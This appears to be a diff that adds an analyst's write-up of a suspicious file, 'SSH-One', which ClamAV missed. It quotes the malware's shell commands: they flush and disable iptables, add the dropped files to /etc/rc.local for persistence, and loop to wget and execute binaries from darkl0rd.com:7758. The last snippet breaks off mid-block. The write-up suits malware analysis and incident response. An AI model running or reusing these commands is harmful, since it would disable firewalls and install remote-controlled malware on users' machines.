@@ -1,0 +1,54 @@
+One of the files in /home/ubuntu/Downloads/ looks suspicious as well but it wasn’t detected by Clamscan. The file is SSH-One. 
+
+1. The script seems to work to disable iptables and check the if service is disabled: 
+
+==============================================
+iptables -F
+/etc/init.d/iptables stop
+chkconfig iptables off
+==============================================
+
+
+2. Afterwards, it changes the values in the /tmp/SSH-T and /tmp/SSH-One files to the rc.local superuser startup script.  
+
+==============================================
+echo "chmod +x /tmp/SSH-T" >> /etc/rc.local
+echo "/tmp/SSH-T" >>  /etc/rc.local
+echo "chmod +x /tmp/SSH-One" >> /etc/rc.local
+echo "/tmp/SSH-One" >>  /etc/rc.local
+==============================================
+
+3. The scrip fetches data from some links and loops over both SSH-T and SSH-One to change permissions to execute the files: 
+ 
+==============================================
+m=SSH-T
+script=SSH-One
+hfs_m=http://darkl0rd.com:7758/SSH-T
+hfs_s=http://darkl0rd.com:7758/SSH-One
+rm -f /tmp/$m*
+while true
+
+do
+    ps aux | grep $m | grep -v grep
+    if [ $? -eq 0 ];then
+         sleep 10
+    else
+                ls -l /tmp/$m
+                        if [ $? -eq 0 ];then
+                         /tmp/$m
+                        else
+    cd /tmp/;wget $hfs_m ; chmod a+x $m;/tmp/$m
+        fi
+   fi
+    ps aux | grep $script | grep -v grep
+    if [ $? -eq 0 ];then
+         sleep 10
+    else
+        ls -l /tmp/$script
+        if [ $? -eq 0];then
+==============================================
+
+4. The contacted links are: 
+	- http://darkl0rd.com:7758/SSH-T
+	- http://darkl0rd.com:7758/SSH-One
+
